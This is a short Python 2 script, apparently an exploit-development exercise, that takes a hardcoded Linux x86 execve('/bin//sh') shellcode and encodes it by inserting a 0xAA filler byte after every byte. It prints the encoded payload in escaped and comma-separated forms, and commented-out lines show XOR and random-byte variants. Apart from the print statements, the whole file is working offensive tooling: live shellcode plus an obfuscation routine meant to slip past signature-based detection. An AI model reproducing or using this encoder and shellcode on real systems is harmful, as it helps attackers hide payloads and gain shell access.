#!/usr/bin/python

# Python Insertion Encoder 
import random
import sys


shellcode  = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
#shellcode = (sys.argv[1])


encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

for x in bytearray(shellcode) :
	

	#x = x^int("0xe1", 16)

	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % 0xAA

	# encoded += '\\x%02x' % random.randint(1,255)

	encoded2 += '0x'
	encoded2 += '%02x,' %x
	encoded2 += '0x%02x,' % 0xAA

	# encoded2 += '0x%02x,' % random.randint(1,255)



print encoded

print encoded2

print 'Len: %d' % len(bytearray(shellcode))
